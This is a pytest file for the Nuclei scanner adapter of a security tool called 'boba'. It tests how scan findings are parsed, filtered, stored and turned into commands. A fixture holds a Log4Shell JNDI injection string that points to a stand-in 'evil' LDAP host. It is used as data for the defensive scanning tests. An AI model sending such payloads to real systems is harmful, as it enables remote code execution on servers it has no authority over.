"""Tests for high-level scan tool functions (Nuclei)."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

from boba.adapters.nuclei import NucleiAdapter
from boba.core.models import AdapterConfig, ToolResult
from boba.tools import scan


def _make_result(tool_name: str, records: list[dict]) -> ToolResult:
    """Build a fake ToolResult for mocking adapter.run()."""
    return ToolResult(
        tool_name=tool_name,
        command=[tool_name],
        exit_code=0,
        raw_stdout="",
        raw_stderr="",
        duration_seconds=2.5,
        records=records,
        filtered_count=0,
    )


# -- Raw nuclei JSON fixtures ------------------------------------------------

NUCLEI_RAW_FINDING = {
    "template-id": "cve-2021-44228",
    "info": {
        "name": "Log4j RCE (CVE-2021-44228)",
        "severity": "critical",
        "description": "Apache Log4j2 JNDI RCE",
        "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        "tags": ["cve", "rce", "log4j"],
    },
    "type": "http",
    "host": "https://api.example.com",
    "matched-at": "https://api.example.com/login",
    "extracted-results": ["${jndi:ldap://evil}"],
    "curl-command": "curl -X GET https://api.example.com/login",
    "matcher-name": "log4j-match",
}

NUCLEI_RAW_INFO = {
    "template-id": "tech-detect",
    "info": {
        "name": "Nginx Detected",
        "severity": "info",
        "description": "",
        "reference": [],
        "tags": ["tech"],
    },
    "type": "http",
    "host": "https://api.example.com",
    "matched-at": "https://api.example.com",
    "extracted-results": [],
    "curl-command": "",
    "matcher-name": "nginx",
}


# =============================================================================
# Tool-layer tests: scan.nuclei_scan()
# =============================================================================


class TestNucleiScan:
    async def test_nuclei_scan_persists_findings(self, manager, sample_hunt):
        """nuclei_scan() should persist findings via upsert_finding."""
        parsed = NucleiAdapter(scope_engine=None).parse_record(NUCLEI_RAW_FINDING)
        records = [parsed]
        mock_run = AsyncMock(return_value=_make_result("nuclei", records))

        with patch("boba.tools.scan.NucleiAdapter.run", mock_run):
            result = await scan.nuclei_scan(
                manager.context, sample_hunt, ["https://api.example.com"]
            )

        assert len(result.records) == 1
        assert result.tool_name == "nuclei"
        saved = manager.context.get_findings(sample_hunt.id)
        assert len(saved) == 1
        assert "cve-2021-44228" in saved[0]["title"]
        assert saved[0]["severity"] == "critical"

    async def test_nuclei_scan_empty_targets(self, manager, sample_hunt):
        """nuclei_scan() with empty targets returns empty result without running adapter."""
        result = await scan.nuclei_scan(manager.context, sample_hunt, [])
        assert result.records == []
        assert result.tool_name == "nuclei"
        assert result.duration_seconds == 0.0

    async def test_nuclei_scan_no_targets_pulls_from_context(self, manager, sample_hunt):
        """When targets is None and no alive hosts exist, returns empty."""
        result = await scan.nuclei_scan(manager.context, sample_hunt, targets=None)
        assert result.records == []

    async def test_nuclei_scan_severity_filter(self, manager, sample_hunt):
        """severity kwarg is passed to config.extra_args_dict."""
        mock_run = AsyncMock(return_value=_make_result("nuclei", []))

        with patch("boba.tools.scan.NucleiAdapter.run", mock_run):
            await scan.nuclei_scan(
                manager.context,
                sample_hunt,
                ["https://api.example.com"],
                severity="critical,high",
            )

        # Verify the adapter was called and config contained severity
        call_kwargs = mock_run.call_args
        config_used = call_kwargs.kwargs.get("config") or call_kwargs[1].get("config")
        if config_used is None:
            # Adapter.run is called as run(targets=..., config=...) positionally
            config_used = (
                call_kwargs[0][1] if len(call_kwargs[0]) > 1 else call_kwargs.kwargs["config"]
            )
        assert config_used.extra_args_dict["severity"] == "critical,high"

    async def test_nuclei_scan_tags_filter(self, manager, sample_hunt):
        """tags kwarg is passed to config.extra_args_dict."""
        mock_run = AsyncMock(return_value=_make_result("nuclei", []))

        with patch("boba.tools.scan.NucleiAdapter.run", mock_run):
            await scan.nuclei_scan(
                manager.context,
                sample_hunt,
                ["https://api.example.com"],
                tags="cve,rce",
            )

        config_used = mock_run.call_args.kwargs.get("config")
        if config_used is None:
            config_used = mock_run.call_args[0][1]
        assert config_used.extra_args_dict["tags"] == "cve,rce"

    async def test_nuclei_scan_templates_filter(self, manager, sample_hunt):
        """templates kwarg is passed to config.extra_args_dict."""
        mock_run = AsyncMock(return_value=_make_result("nuclei", []))

        with patch("boba.tools.scan.NucleiAdapter.run", mock_run):
            await scan.nuclei_scan(
                manager.context,
                sample_hunt,
                ["https://api.example.com"],
                templates="/custom/templates",
            )

        config_used = mock_run.call_args.kwargs.get("config")
        if config_used is None:
            config_used = mock_run.call_args[0][1]
        assert config_used.extra_args_dict["templates"] == "/custom/templates"

    async def test_nuclei_scan_multiple_findings(self, manager, sample_hunt):
        """Multiple findings are all persisted."""
        adapter = NucleiAdapter(scope_engine=None)
        records = [
            adapter.parse_record(NUCLEI_RAW_FINDING),
            adapter.parse_record(NUCLEI_RAW_INFO),
        ]
        mock_run = AsyncMock(return_value=_make_result("nuclei", records))

        with patch("boba.tools.scan.NucleiAdapter.run", mock_run):
            result = await scan.nuclei_scan(
                manager.context, sample_hunt, ["https://api.example.com"]
            )

        assert len(result.records) == 2
        saved = manager.context.get_findings(sample_hunt.id)
        assert len(saved) == 2

    async def test_nuclei_scan_tool_run_logged(self, manager, sample_hunt):
        """Tool run is logged after scan."""
        parsed = NucleiAdapter(scope_engine=None).parse_record(NUCLEI_RAW_FINDING)
        mock_run = AsyncMock(return_value=_make_result("nuclei", [parsed]))

        with patch("boba.tools.scan.NucleiAdapter.run", mock_run):
            await scan.nuclei_scan(manager.context, sample_hunt, ["https://api.example.com"])

        runs = manager.context.get_tool_runs(sample_hunt.id)
        assert any(r["tool_name"] == "nuclei" for r in runs)


# =============================================================================
# Adapter-level tests: NucleiAdapter.parse_record / build_command
# =============================================================================


class TestNucleiAdapterParseRecord:
    def test_parse_record_full_json(self):
        adapter = NucleiAdapter(scope_engine=None)
        record = adapter.parse_record(NUCLEI_RAW_FINDING)

        assert record["template_id"] == "cve-2021-44228"
        assert record["template_name"] == "Log4j RCE (CVE-2021-44228)"
        assert record["severity"] == "critical"
        assert record["finding_type"] == "http"
        assert record["host"] == "https://api.example.com"
        assert record["url"] == "https://api.example.com/login"
        assert record["extracted_results"] == ["${jndi:ldap://evil}"]
        assert record["curl_command"] == "curl -X GET https://api.example.com/login"
        assert record["description"] == "Apache Log4j2 JNDI RCE"
        assert "cve" in record["tags"]
        assert "rce" in record["tags"]
        assert record["matcher_name"] == "log4j-match"

    def test_parse_record_info_severity(self):
        adapter = NucleiAdapter(scope_engine=None)
        record = adapter.parse_record(NUCLEI_RAW_INFO)

        assert record["template_id"] == "tech-detect"
        assert record["severity"] == "info"
        assert record["matcher_name"] == "nginx"
        assert record["extracted_results"] == []

    def test_parse_record_string_fallback(self):
        """When raw is a plain string, parse_record wraps it as a URL dict."""
        adapter = NucleiAdapter(scope_engine=None)
        record = adapter.parse_record("https://target.example.com")
        assert record == {"url": "https://target.example.com"}

    def test_parse_record_missing_fields(self):
        """Missing optional fields default to empty strings/lists."""
        adapter = NucleiAdapter(scope_engine=None)
        record = adapter.parse_record({"host": "https://example.com"})

        assert record["template_id"] == ""
        assert record["template_name"] == ""
        assert record["severity"] == "info"
        assert record["finding_type"] == ""
        assert record["url"] == "https://example.com"
        assert record["extracted_results"] == []
        assert record["curl_command"] == ""
        assert record["description"] == ""
        assert record["reference"] == []
        assert record["tags"] == []
        assert record["matcher_name"] == ""

    def test_parse_record_matched_at_preferred_over_host(self):
        """matched-at is used as url when present, host is fallback."""
        adapter = NucleiAdapter(scope_engine=None)
        record = adapter.parse_record(
            {"host": "https://example.com", "matched-at": "https://example.com/vuln"}
        )
        assert record["url"] == "https://example.com/vuln"


class TestNucleiAdapterExtractScopeTarget:
    def test_extract_scope_target_host(self):
        adapter = NucleiAdapter(scope_engine=None)
        record = {"host": "https://api.example.com", "url": "https://api.example.com/path"}
        assert adapter.extract_scope_target(record) == "https://api.example.com"

    def test_extract_scope_target_url_fallback(self):
        adapter = NucleiAdapter(scope_engine=None)
        record = {"url": "https://api.example.com/path"}
        assert adapter.extract_scope_target(record) == "https://api.example.com/path"

    def test_extract_scope_target_none(self):
        adapter = NucleiAdapter(scope_engine=None)
        assert adapter.extract_scope_target({}) is None


class TestNucleiAdapterBuildCommand:
    def _adapter_with_binary(self):
        """Create an adapter with a fake binary path set."""
        adapter = NucleiAdapter(scope_engine=None)
        adapter._binary_path = "/usr/local/bin/nuclei"
        return adapter

    def test_build_command_single_target(self):
        adapter = self._adapter_with_binary()
        config = AdapterConfig()
        cmd, _ = adapter.build_command(["https://target.example.com"], config)

        assert cmd[0] == "/usr/local/bin/nuclei"
        assert "-u" in cmd
        assert "https://target.example.com" in cmd
        assert "-jsonl" in cmd
        assert "-silent" in cmd

    def test_build_command_multiple_targets(self, tmp_path):
        adapter = self._adapter_with_binary()
        adapter._temp_dir = tmp_path
        config = AdapterConfig()

        targets = ["https://a.example.com", "https://b.example.com"]
        cmd, _ = adapter.build_command(targets, config)

        assert "-l" in cmd
        # Should NOT have -u for multiple targets
        assert "-u" not in cmd

    def test_build_command_severity_filter(self):
        adapter = self._adapter_with_binary()
        config = AdapterConfig(extra_args_dict={"severity": "critical,high"})
        cmd, _ = adapter.build_command(["https://target.example.com"], config)

        idx = cmd.index("-severity")
        assert cmd[idx + 1] == "critical,high"

    def test_build_command_tags_filter(self):
        adapter = self._adapter_with_binary()
        config = AdapterConfig(extra_args_dict={"tags": "cve,rce"})
        cmd, _ = adapter.build_command(["https://target.example.com"], config)

        idx = cmd.index("-tags")
        assert cmd[idx + 1] == "cve,rce"

    def test_build_command_templates_dir(self):
        adapter = self._adapter_with_binary()
        config = AdapterConfig(extra_args_dict={"templates": "/custom/templates"})
        cmd, _ = adapter.build_command(["https://target.example.com"], config)

        idx = cmd.index("-t")
        assert cmd[idx + 1] == "/custom/templates"

    def test_build_command_rate_limit(self):
        adapter = self._adapter_with_binary()
        config = AdapterConfig(rate_limit=100)
        cmd, _ = adapter.build_command(["https://target.example.com"], config)

        idx = cmd.index("-rate-limit")
        assert cmd[idx + 1] == "100"

    def test_build_command_extra_args(self):
        adapter = self._adapter_with_binary()
        config = AdapterConfig(extra_args=["-headless", "-timeout", "10"])
        cmd, _ = adapter.build_command(["https://target.example.com"], config)

        assert "-headless" in cmd
        assert "-timeout" in cmd
        assert "10" in cmd

    def test_build_command_all_filters_combined(self):
        adapter = self._adapter_with_binary()
        config = AdapterConfig(
            extra_args_dict={
                "severity": "critical",
                "tags": "cve",
                "templates": "/t",
            },
            rate_limit=50,
            extra_args=["-headless"],
        )
        cmd, _ = adapter.build_command(["https://target.example.com"], config)

        assert "-severity" in cmd
        assert "-tags" in cmd
        assert "-t" in cmd
        assert "-rate-limit" in cmd
        assert "-headless" in cmd


class TestNucleiAdapterMetadata:
    def test_tool_name(self):
        assert NucleiAdapter.TOOL_NAME == "nuclei"

    def test_produces(self):
        assert NucleiAdapter.PRODUCES == "finding"

    def test_scope_mode(self):
        assert NucleiAdapter.SCOPE_MODE == "pre"

    def test_install_hint(self):
        adapter = NucleiAdapter(scope_engine=None)
        hint = adapter.install_hint()
        assert "nuclei" in hint
        assert "go install" in hint
